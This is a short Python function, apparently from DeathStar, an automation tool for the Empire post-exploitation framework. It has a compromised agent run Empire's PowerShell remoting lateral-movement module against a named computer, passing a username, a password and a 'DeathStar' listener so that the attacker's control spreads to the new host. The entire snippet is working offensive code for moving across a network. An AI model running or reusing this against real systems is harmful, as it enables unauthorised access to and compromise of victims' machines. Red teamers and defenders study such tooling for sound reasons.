async def crystallize(
    agent, computer_name, username="", password="", listener="DeathStar"
):
    output = await agent.execute(
        "powershell/lateral_movement/invoke_psremoting",
        options={
            "ComputerName": computer_name,
            "Listener": listener,
            "UserName": username,
            "Password": password,
        },
    )

    results = output["results"].strip()
    log.debug(results)
    return results
